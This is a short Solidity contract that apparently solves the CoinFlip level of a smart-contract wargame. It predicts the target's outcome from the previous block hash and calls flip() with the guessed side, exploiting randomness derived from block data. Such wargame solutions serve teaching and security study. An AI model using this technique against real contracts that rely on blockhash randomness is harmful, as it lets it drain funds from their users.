// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipSolution {
    using SafeMath for uint256;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip level;

    constructor() public {
        level = CoinFlip(0x9Cb91129dC906391fefABD9238740Ccc7B3F8B2f);
    }

    function solve() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        level.flip(side);
    }
}
